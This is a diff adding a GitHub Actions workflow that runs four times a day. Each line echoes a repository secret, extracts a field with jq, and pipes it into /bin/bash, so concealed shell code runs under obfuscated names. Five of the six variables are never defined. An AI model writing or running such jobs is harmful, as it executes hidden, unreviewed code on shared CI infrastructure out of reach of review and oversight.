@@ -1,0 +1,24 @@
+name: riquanyuxiao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: riquanyuxiao
+        env:
+          anwtv1473: ${{ secrets.anwtv1473 }}
+        run: |
+          echo $anwtv1473 | jq -r .gr55 | /bin/bash
+          echo $czlm0451 | jq -r .ferw025 | /bin/bash
+          echo $dlefk07 | jq -r .q097 | /bin/bash
+          echo $axf5495 | jq -r .jggei9781 | /bin/bash
+          echo $jnv57662 | jq -r .trl88 | /bin/bash
+          echo $jtmdr5227 | jq -r .jkq791 | /bin/bash
+
